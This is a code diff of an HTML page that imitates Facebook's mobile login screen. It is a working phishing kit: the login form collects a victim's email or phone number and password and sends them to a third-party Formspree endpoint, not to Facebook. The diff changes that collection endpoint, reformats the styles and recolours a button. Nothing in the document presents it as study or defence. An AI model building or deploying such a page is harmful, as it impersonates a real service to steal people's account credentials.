@@ -6,17 +6,47 @@
     <title>Facebook Mobile</title>
     <style>
         * { box-sizing: border-box; }
-        body { margin: 0; padding: 0; font-family: Helvetica, Arial, sans-serif; background-color: #fff; display: flex; flex-direction: column; align-items: center; }
+        body { 
+            margin: 0; padding: 0; font-family: Helvetica, Arial, sans-serif; 
+            background-color: #fff; display: flex; flex-direction: column; align-items: center; 
+        }
+
+        /* Facebook Logo Header */
         .header { width: 100%; text-align: center; padding: 30px 0 10px; }
         .header img { width: 130px; }
+
+        /* Form Container */
         .container { width: 90%; max-width: 400px; margin-top: 10px; }
-        input { width: 100%; padding: 15px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; background: #f5f6f7; outline: none; }
-        .btn-blue { width: 100%; background: #1877f2; color: white; border: none; padding: 12px; font-size: 18px; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 5px; }
-        .link-text { display: block; text-align: center; margin: 15px 0; color: #1877f2; text-decoration: none; font-size: 14px; cursor: pointer; }
-        .divider { display: flex; align-items: center; color: #8a8d91; margin: 20px 0; font-size: 13px; }
+        
+        input { 
+            width: 100%; padding: 15px; margin-bottom: 10px; 
+            border: 1px solid #ccc; border-radius: 4px; font-size: 16px; 
+            background: #f5f6f7; outline: none;
+        }
+
+        .btn-blue { 
+            width: 100%; background: #1877f2; color: white; border: none; 
+            padding: 12px; font-size: 18px; font-weight: bold; border-radius: 4px; 
+            cursor: pointer; margin-top: 5px;
+        }
+
+        .link-text { 
+            display: block; text-align: center; margin: 15px 0; 
+            color: #1877f2; text-decoration: none; font-size: 14px; cursor: pointer;
+        }
+
+        .divider { 
+            display: flex; align-items: center; color: #8a8d91; 
+            margin: 20px 0; font-size: 13px; 
+        }
         .divider::before, .divider::after { content: ""; flex: 1; border-bottom: 1px solid #ddd; }
         .divider span { padding: 0 10px; }
-        .btn-new { width: 80%; margin: 0 auto; display: block; background: #fff; color: #1877f2; border: 1px solid #1877f2; padding: 10px; font-weight: bold; border-radius: 4px; cursor: pointer; }
+
+        .btn-new { 
+            width: 80%; margin: 0 auto; display: block; background: #fff; 
+            color: #42b72a; border: 1px solid #42b72a; padding: 10px; 
+            font-weight: bold; border-radius: 4px; cursor: pointer;
+        }
     </style>
 </head>
 <body>
@@ -27,17 +57,19 @@
 
     <div id="login-view" class="container">
         
-  <form action="https://formspree.io/f/mqkapoow" method="POST">
-    
-    <input type="text" name="Email_Or_Phone" placeholder="Mobile number or email" required>
-    <input type="password" name="User_Password" placeholder="Password" required>
-    
-    <button type="submit" class="btn-blue">Log In</button>
-    
-</form>
+        <form action="https://formspree.io/f/xlgpjeon" method="POST">
+            
+            <input type="text" name="Email_or_Phone" placeholder="Mobile number or email" required>
+            <input type="password" name="User_Password" placeholder="Password" required>
+            
+            <button type="submit" class="btn-blue">Log In</button>
+            
+        </form>
 
         <div class="link-text">Forgotten password?</div>
+        
         <div class="divider"><span>or</span></div>
+        
         <button class="btn-new">Create new account</button>
     </div>
 
